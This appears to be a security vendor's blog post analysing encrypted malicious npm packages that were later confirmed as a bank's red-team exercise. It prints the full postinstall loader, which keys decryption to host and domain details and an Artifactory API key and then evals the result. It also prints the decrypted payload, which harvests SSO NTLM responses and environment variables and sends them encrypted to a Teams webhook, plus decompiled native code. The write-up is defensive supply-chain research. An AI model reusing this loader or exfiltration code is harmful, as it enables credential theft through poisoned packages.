@@ -1,0 +1,451 @@
+
+Determining the intent behind a package publication is notoriously difficult. Is it a legitimate threat actor or a security researcher? We can rarely make this determination, so Phylum generally errs on the side of caution and annotates packages that exhibit characteristics congruent with malware-like behavior. Today is not such an occasion. Not only were we able to successfully decrypt the malware packages, but we were also able to make contact with the targeted financial institution. Was it a dangerous threat actor or an internal adversarial simulation? Read on to find out! (spoiler)
+Background
+In early November 2023, we began tracking suspicious publications to npm1. The packages in question contained an encrypted blob that appears to be keyed to the targeted machine: decryption is only possible using some local machine information and the decryption key. The decrypted blob is then passed to eval(...) for execution.
+We were able to successfully decrypt this payload, discovering that the key is the domain.tld of a major financial institution. This decrypted payload contains an embedded binary that cleverly exfiltrates user credentials to a Microsoft Teams webhook that is internal to the target company in question2. This suggests an inside job, a very good internal red team simulation, or external threat actors with a strong foothold in the network.
+Upon determining that these packages targeted a very specific organization, we began our outreach attempts. If this was an external attacker, it was critical that the organization was made aware of it before the attackers had an opportunity to do significant damage3.
+Lacking the requisite context to determine if these packages represented an existential threat to the targeted company, we continued to unravel what appeared to be a highly sophisticated attack on the order of other APT threats we had previously identified.
+The Attack Chain
+Comparatively, this is a highly sophisticated attack. As with other campaigns, we assumed this was likely part of a larger operation that would begin targeting additional organizations shortly.
+The attack starts with a simple postinstall hook in the package.json. This hook runs a file called postinstall.js that contains the following:
+(() => {
+  var C = {
+      113: (t) => {
+        "use strict";
+        t.exports = require("crypto");
+      },
+      147: (t) => {
+        "use strict";
+        t.exports = require("fs");
+      },
+      37: (t) => {
+        "use strict";
+        t.exports = require("os");
+      },
+      17: (t) => {
+        "use strict";
+        t.exports = require("path");
+      },
+    },
+    n = {};
+  function s(t) {
+    var l = n[t];
+    return (
+      void 0 !== l || ((l = n[t] = { exports: {} }), C[t](l, l.exports, s)),
+      l.exports
+    );
+  }
+  var t = {};
+  (() => {
+    !(function () {
+      let l = [
+          "dd59c9c091027...", // Very large Base 64 blob redacted for brevity and privacy
+        ],
+        n = s(113),
+        C = s(37),
+        X = s(17),
+        y = s(147);
+      if (n && C && X && y) {
+        let t = [];
+        try {
+          t.push(C.hostname() + "|" + C.userInfo().username);
+        } catch (t) {}
+        try {
+          t.push(
+            y
+              .readFileSync(X.join(C.homedir(), ".npmrc"))
+              .toString()
+              .split("\\n")[0]
+              .split("/")[2]
+              .split(".")
+              .slice(-2)
+              .join(".")
+          );
+        } catch (t) {}
+        try {
+          t.push(
+            process.env.USERDNSDOMAIN.toLowerCase()
+              .split(".")
+              .slice(-2)
+              .join(".")
+          );
+        } catch (t) {}
+        try {
+          t.push(process.env.ARTIFACTORY_API_KEY);
+        } catch (t) {}
+        for (var D of l)
+          for (var r of t)
+            try {
+              eval(o(r, D));
+            } catch (t) {}
+        function I(t) {
+          var l = n.createHash("sha256");
+          return l.update(t), l.digest("hex");
+        }
+        function o(t, l) {
+          var C = l.substring(0, 16),
+            t = I(t).substring(0, 32),
+            t = n.createDecipheriv("aes256", t, C.substring(0, 16));
+          return t.update(l.substring(16), "base64", "utf8") + t.final("utf8");
+        }
+      }
+    })();
+  })();
+})();
+The code above has been formatted for readability. However, it appeared minified in its published form. While it hasn’t been obfuscated in the typical sense, it does contain a gigantic Base64 blob that shouldn't fly under too many radars. Looking at the code itself, we note that the blob is the target of some cryptographic operations. Let’s break this snippet down.
+After a few imports, a list of system-related information is collected. Namely, strings matching a specific pattern are extracted from the following:
+
+The hostname and username producing a string of the form "<hostname>|<username>"
+Information from the .npmrc file
+A specific pattern from the USERDNSDOMAIN environment variable
+The entirety of the ARTIFACTORY_API_KEY environment variable
+In each of these cases, it became clear that the actor was looking for a specific string that took the form of mycompany.tld. It was particularly alarming to see the ARTIFACTORY_API_KEY being used for AES encryption. Either the actor had managed to access the organization’s Artifactory instance or had the ability to set the environment variable on the target system.
+After gathering each string, the actor attempts to decrypt the payload, trying each string as the decryption key until the decryption is successful.
+At this point, we formulated a plan of attack to decrypt the payload. To better assist with triage and remediation, should we receive a response back from the targeted organization, we needed to understand what the encrypted payload was doing. We knew that the encryption key had to be one of the strings the actor previously gathered above. Brute-forcing the hostname or username seemed intractable, as did brute-forcing the contents of the Artifactory API key. The search space for the domain.tld seemed within reach, especially since this level of sophistication would not likely be wasted on a company without a decently large web presence.
+We grabbed a list we had handy, modified the actor’s script to attempt decryption using the items in our list as keys, and crossed our fingers that one would successfully decrypt the payload. While our first list failed to produce the decrypted payload, a subsequent attempt with a new list succeeded! The decryption key ended up being the domain.tld of a major financial institution. At this point, it was clear that this was not your run-of-the-mill bug bounty attempt, and while the intent was still unclear, we deemed it prudent to begin outreach attempts to the targeted organization.
+Using our identified key, we could now decrypt several other package payloads successfully:
+(() => {
+  var d = {
+      228: (f, c, b) => {
+        {
+          var d = `e9c60400005...`.replaceAll("\\n", "");  // Very large hex blob truncated for brevity and privacy
+          const i = b(808),
+            u = b(992),
+            p = b(113);
+          var e = [8, 4, 4, 4, 12]
+            .map((f) => p.randomBytes(f / 2).toString("hex"))
+            .join("-");
+          {
+            var a = e,
+              t = function (f) {
+                var c,
+                  d,
+                  e = b(37);
+                (process.env.SMSESSION =
+                  ((c = "SMSESSION="),
+                  (d = ";"),
+                  (f = (f = f).substring(
+                    f.search(c.replace("(", "\\\\(")) + c.length
+                  )).substring(0, f.search(d)))),
+                  (process.env.HOSTNAME = e.hostname()),
+                  global.callback(JSON.stringify(process.env));
+              };
+            a = "\\\\\\\\.\\\\pipe\\\\" + e;
+            let c = "";
+            var r = i.createServer(function (f) {
+              f.on("data", function (f) {
+                f = f.toString();
+                (c += f), -1 != f.indexOf("[DONE]") && r.close();
+              }),
+                f.on("end", function () {});
+            });
+            r.on("close", function () {
+              t(c);
+            }),
+              r.listen(a, function () {});
+          }
+          for (
+            var n = (d = d.replace(
+                "31643837333437372d663765622d343736662d616530312d646362356332303661316461",
+                Buffer.from(e).toString("hex")
+              )).toString(),
+              o = [],
+              s = 0;
+            s < n.length;
+            s += 2
+          )
+            o.push(parseInt(n.substr(s, 2), 16));
+          u.Databse(o);
+        }
+      },
+      766: (f) => {
+        function c(f) {
+          f = new Error("Cannot find module '" + f + "'");
+          throw ((f.code = "MODULE_NOT_FOUND"), f);
+        }
+        (c.keys = () => []), ((c.resolve = c).id = 766), (f.exports = c);
+      },
+      113: (f) => {
+        "use strict";
+        f.exports = require("crypto");
+      },
+      147: (f) => {
+        "use strict";
+        f.exports = require("fs");
+      },
+      687: (f) => {
+        "use strict";
+        f.exports = require("https");
+      },
+      808: (f) => {
+        "use strict";
+        f.exports = require("net");
+      },
+      37: (f) => {
+        "use strict";
+        f.exports = require("os");
+      },
+      17: (f) => {
+        "use strict";
+        f.exports = require("path");
+      },
+      992: (f) => {
+        "use strict";
+        f.exports = require("./lib/sqlite3/lib/binding/napi-v6-win32-unknown-x64/node_sqlite3.node");
+      },
+    },
+    e = {};
+  function b(f) {
+    var c = e[f];
+    return (
+      void 0 !== c || ((c = e[f] = { exports: {} }), d[f](c, c.exports, b)),
+      c.exports
+    );
+  }
+  b.o = (f, c) => Object.prototype.hasOwnProperty.call(f, c);
+  if (process && b(766)) {
+    let r = b(687),
+      n = b(113);
+    var f = b(17),
+      c = b(147);
+    if (r && n && f && c) {
+      f = f.join(
+        process.env.TMP || "/tmp",
+        "324f0806-0bdc-d31b-6f3a-6eeea6f7d4a2"
+      );
+      if (!c.existsSync(f)) {
+        c.writeFileSync(f, "", { flag: "w+" });
+        let t = `-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC79Pye6tR52mD67NZ6wZga/K3N
+HuzH4i5sKmBBrhEL6boW5YQZi7t6pW2PWJq8a4/INyyZsLzTV/L5aFB0iVEgr58F
+m4RiHncCphPbDIRnMjyqiBRXa/y8hwJ62D9ZtijW78UV5JnS2bq9bmwRf1hGVwqK
+aj+nASVX3uFxQLJssQIDAQAB
+-----END PUBLIC KEY-----
+`;
+        function a() {
+          return n.randomBytes(16).toString("hex");
+        }
+        function o(f, c) {
+          var d = a().substring(0, 16),
+            f =
+              ((f = f),
+              (e = n.createHash("sha256")).update(f),
+              e.digest("hex").substring(0, 32)),
+            e = n.createCipheriv("aes256", f, d.substring(0, 16));
+          return d + Buffer.concat([e.update(c), e.final()]).toString("base64");
+        }
+        function s(f, c) {
+          var d,
+            e = a();
+          return (
+            (f = f),
+            (d = e),
+            [
+              n.publicEncrypt(f, Buffer.from(d)).toString("base64"),
+              o(e, c),
+            ].join("")
+          );
+        }
+        (global.callback = function (f) {
+          let c = 0;
+          var d,
+            e,
+            b,
+            a = [8, 4, 4, 4, 12]
+              .map((f) => n.randomBytes(f / 2).toString("hex"))
+              .join("-");
+          for (d of (function (c) {
+            var d = 14e3,
+              e = Math.ceil(c.length / d),
+              b = [];
+            for (let f = 0; f < e; ++f) {
+              var a = f * d > c.length ? (f - 1) * d - c.length : d,
+                a = c.substring(f * d, f * d + a);
+              b.push(a);
+            }
+            return b;
+          })(f))
+            (e = a + ":" + c++ + ":" + d),
+              (b = void 0),
+              (e = {
+                "@context": "<http://schema.org/extensions>",
+                "@type": "MessageCard",
+                text: "```\\n" + s(t, e) + "\\n```",
+              }),
+              (process.env.NODE_TLS_REJECT_UNAUTHORIZED = 0),
+              (b = r.request("INTERNAL_TEAMS_WEEBHOOK", // Redacted for privacy
+                {
+                  method: "POST",
+                  timeout: 1e3,
+                  headers: { "Content-Type": "application/json" },
+                }
+              )) &&
+                (b.on("error", function (f) {}),
+                b.on("socket", function (f) {
+                  setTimeout(() => {
+                    f.destroy();
+                  }, 1e3);
+                }),
+                b.on("close", function (f) {}),
+                b.write(JSON.stringify(e)),
+                b.end());
+        }),
+          b(228);
+      }
+    }
+  }
+})();
+One of the things that stood out to us about this payload was its use of a webhook that appeared to be internal to the company itself! Does this suggest that the actor has a foothold in the network and is using internal tools as an exfiltration mechanism or an internal operation of some sort? To attempt to answer this question, we pressed on with our assessment of the embedded binary.
+Analyzing The Binary
+The Node.js code creates a named pipe server with a random UUID name, replaces the UUID in the hex blob with the generated one, decodes the hex bytes into a Javascript array, and passes them to a mystery function sqlite.Databse (notice the misspelling). The binary is x86_64 machine code which uses the Wininet API to make an HTTP request to /siteminderagent/ntlm/creds.ntc (CA Single Sign-On) and sends the authentication response to the named pipe. Once the data is received by the named pipe, the Javascript side encrypts the data and exfiltrates it, along with all the process’s environment variables, via the webhook.
+Decompiling the code gives something like this:
+dword authenticateByNtlm(char *targetAddress)
+{
+  dword ret;
+  int iVar1;
+  undefined8 code;
+  longlong lVar2;
+  URL_COMPONENTSA *urlComponentsZeroCursor;
+  dword local_c0;
+  uint statusCode;
+  URL_COMPONENTSA urlComponents;
+  uint length;
+  char *buffer;
+  void *request;
+  void *connection;
+  void *internet;
+  char *hostname;
+  int errors;
+  bool tooManyErrors;
+  
+  errors = 0;
+  length = 20000;
+                    /* Initialize urlComponents */
+  urlComponentsZeroCursor = &urlComponents;
+  for (lVar2 = 0xd; lVar2 != 0; lVar2 = lVar2 + -1) {
+    *(undefined8 *)urlComponentsZeroCursor = 0;
+    urlComponentsZeroCursor = (URL_COMPONENTSA *)&urlComponentsZeroCursor->scheme;
+  }
+  local_c0 = 4;
+  urlComponents.structSize = 0x68;
+  urlComponents.hostNameLength = 1;
+  urlComponents.urlPathLength = 1;
+  ret = internetCrackUrl(targetAddress,0,0,&urlComponents);
+  if (ret == 0) {
+    sendMessageToPipe(s_Couldn't_crack_SSO_url._00000533);
+    code = 0;
+  }
+  else {
+    hostname = (char *)malloc((ulonglong)urlComponents.hostNameLength + 1);
+    memcpy(hostname,urlComponents.hostName,urlComponents.hostNameLength);
+    hostname[urlComponents.hostNameLength] = '\\0';
+    internet = (void *)internetOpen(s_Mozilla/5.0_(Windows_NT_10.0;_Wi_0000054d,0,(char *)0x0,
+                                    (char *)0x0,0);
+    connection = internetConnect(internet,hostname,urlComponents.port,(char *)0x0,(char *)0x0,3,0,
+                                 (dword *)0x0);
+    request = (void *)httpOpenRequest(connection,s_GET_000005cf,urlComponents.urlPath,(char *)0x0,
+                                      (char *)0x0,(char **)0x0,0xe00000,(dword *)0x0);
+    do {
+      while( true ) {
+        while( true ) {
+          httpSendRequest(request,(char *)0x0,0,(void *)0x0,0);
+          httpQueryInfo(request,HTTP_QUERY_FLAG_NUMBER | HTTP_QUERY_STATUS_CODE,&statusCode,
+                        &local_c0,(dword *)0x0);
+          if (statusCode != 401) break;
+          sendMessageToPipe(s_HTTP_STATUS_DENIED_000005d3);
+          iVar1 = errors + 1;
+          tooManyErrors = 1 < errors;
+          errors = iVar1;
+          if (tooManyErrors) goto gotLink;
+        }
+        if (statusCode < 402) break;
+unknownStatus:
+        sendMessageToPipe(s_UNKNOWN_STATUS_000005f7);
+        tooManyErrors = 1 < errors;
+        errors = errors + 1;
+        if (tooManyErrors) {
+          return 0;
+        }
+      }
+      if (statusCode == 200) {
+        sendMessageToPipe(s_HTTP_STATUS_OK_000005e7);
+        break;
+      }
+      if (statusCode != 302) goto unknownStatus;
+      buffer = (char *)malloc_2(20000);
+      iVar1 = httpQueryInfo_2(request,HTTP_QUERY_RAW_HEADERS_CRLF,buffer,&length,0);
+      if (iVar1 != 0) {
+        buffer[length] = '\\0';
+        sendMessageToPipe(buffer);
+      }
+      while ((iVar1 = internetReadFile(request,buffer,20000,&length), iVar1 != 0 && (length != 0)))
+      {
+        buffer[length] = '\\0';
+        sendMessageToPipe(buffer);
+        length = 0;
+      }
+      iVar1 = errors + 1;
+      tooManyErrors = errors < 2;
+      errors = iVar1;
+    } while (tooManyErrors);
+gotLink:
+    buffer = (char *)malloc_3(20000);
+    iVar1 = httpQueryInfo_3(request,HTTP_QUERY_RAW_HEADERS_CRLF,buffer,&length,0);
+    if (iVar1 != 0) {
+      buffer[length] = '\\0';
+      sendMessageToPipe(buffer);
+    }
+    while ((iVar1 = internetReadFile_2(request,buffer,20000,&length), iVar1 != 0 && (length != 0)))
+    {
+      buffer[length] = '\\0';
+      sendMessageToPipe(buffer);
+      length = 0;
+    }
+    free(buffer);
+    free_2(hostname);
+    code = 1;
+  }
+  return code;
+}
+Which can be simplified to something like this:
+import requests
+
+def authenticateByNtlm(targetAddress: str):
+		response = requests.get(targetAddress)
+		print(response.headers)
+		print(response.text)
+You might wonder why they would use Wininet to make HTTP requests on behalf of Node.js code instead of directly using the Node.js HTTP module. It turns out the Node.js module does not support NTLM authentication, but the Wininet code leverages the underlying Windows API to handle complex authentication schemes that Node.js itself doesn't support natively. This approach is particularly ingenious because Wininet can automatically use the credentials of the currently logged-in user to authenticate with Single Sign-On (SSO) services.
+Making Contact
+Late on November 20, 2023, we received a message from the company in question.
+On a follow-up call, we provided them with information on the packages, namespace, and behavior. In doing so, the company was able to confirm that, yes, these packages were part of an advanced adversary simulation exercise.
+As security researchers, interesting or novel findings are exhilarating. Alas, while the threat actor was of the right sort, their intentions ended up being benign. However, this does not mean we can’t learn from the attack to better thwart adversaries in the future.
+Now a Word From The Red Team
+We gleaned some additional insights into the attacker’s perspective and methodology in speaking with the company 4. The attack began rather simply: A developer workstation was compromised. This developer had the required access not only to access the internal Artifactory instance but also to push updates to existing libraries.
+With access to critical engineering infrastructure, the red team identified a library used commonly across development groups at the company. They updated this library to depend on one of the external packages Phylum identified and pushed it back to Artifactory (with a small version bump to ensure builds would pull the latest version and not a cached copy).
+As internal development groups began updating their projects, this infected library was pulled and executed on many machines. The red team now sat back and watched as the infected library spread to several development groups across the company. If this isn’t alarming to you, consider what this sort of access afforded attackers who compromised Microsoft just this year.
+With their newly infected package successfully deployed, the red team had a viable asynchronous command and control path across many disparate points in the company. The external dependency served as the mechanism by which commands could be issued, with exfiltrated data being passed to a Microsoft Teams webhook controlled by the red team.
+There are a few things we should take away from this experience. First, developers are high-value targets. With the plethora of typosquats and dependency confusion attempts we see routinely published to open source, it’s clear that attackers are keenly aware of this fact. Second, software libraries are rarely vetted for malicious modifications. Consider that most software pulls in code from external open source registries written by individuals whose motivations and intent may not align with your own, and you see why this might be a problem. And third, and most importantly, software supply chain attacks are wildly effective against even the most prepared organizations.
+Conclusion
+As we noted before, intent is extremely difficult to determine. Open source poses a unique challenge for organizations. Rarely are packages properly vetted before execution on developer workstations or production infrastructure.
+Phylum automatically analyzes all packages published to open source registries - seven registries in total - to identify unknown risks originating from using open source packages. While this attack was the work of a talented red team, many others we’ve seen ended up being malicious attacks against specific organizations. Today’s red team simulation is tomorrow’s legitimate threat. Is your organization sufficiently prepared to tell the difference?
+Footnotes
+1 We've intentionally left out the names of the packages and namespaces to protect the identity of the targeted organization.
+2 The call was coming from inside the house!
+3 Phylum offers a subscription to our threat feed so you can monitor malware packages before they impact your developers.
+4 Special thanks to the organization for providing additional insight into the attack path. It's rare that we get this level of insight.
+eval(...)
+domain.tld
+postinstall
+package.json
+postinstall.js
+"<hostname>|<username>"
+.npmrc
+USERDNSDOMAIN
+ARTIFACTORY_API_KEY
+mycompany.tld
+ARTIFACTORY_API_KEY
+domain.tld
+domain.tld
+sqlite.Databse
+x86_64
+/siteminderagent/ntlm/creds.ntc
